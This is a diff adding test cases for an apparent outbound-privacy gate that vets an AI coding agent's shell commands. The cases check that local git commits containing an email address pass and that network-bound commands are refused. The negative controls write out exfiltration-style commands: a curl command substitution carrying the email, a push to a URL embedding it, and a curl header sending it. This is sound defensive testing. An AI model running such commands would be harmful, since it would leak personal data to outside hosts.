@@ -1919,6 +1919,22 @@ def check_outbound_privacy_gate_refuses_and_scan_finds():
         rc, _ = run_gate('Bash', {'command': f'git commit -m "see https://a.b" '
                                              f'--author="A <{email}>"'})
         cases.append(('...and with the URL in -m', rc == 0))
+        # 2026-11-18: the third refusal. A message spanning lines inside
+        # quotes, and --trailer, both read as outbound until git commands
+        # were read by subcommand instead of by message shape.
+        rc, out = run_gate('Bash', {'command': f'git commit --author="A <{email}>" -m "subject\n\n'
+                                              'Claude-Session: https://claude.ai/code/x"'})
+        cases.append(('...and with a quoted -m that spans lines', rc == 0, failure_detail(out, 200)))
+        rc, out = run_gate('Bash', {'command': f"git commit --author='A <{email}>' -m s "
+                                              "--trailer 'Claude-Session: https://claude.ai/code/x'"})
+        cases.append(('...and with the URL in --trailer', rc == 0, failure_detail(out, 200)))
+        rc, out = run_gate('Bash', {'command': f'git commit -m "$(curl https://x/?{email})"'})
+        cases.append(('NEGATIVE CONTROL: a command substitution that reaches the network '
+                      'inside a local commit is still refused',
+                      rc == 2 and 'OUTBOUND PRIVACY' in out, failure_detail(out, 200)))
+        rc, out = run_gate('Bash', {'command': f'git push https://{email}@example.com/r'})
+        cases.append(('NEGATIVE CONTROL: a push carrying the address is refused',
+                      rc == 2 and 'OUTBOUND PRIVACY' in out, failure_detail(out, 200)))
         rc, _ = run_gate('Bash', {'command': commit + f'\ncurl -H "From: {email}" https://example.com'})
         cases.append(('NEGATIVE CONTROL: a commit followed by a curl carrying the '
                       'address is still refused', rc == 2))
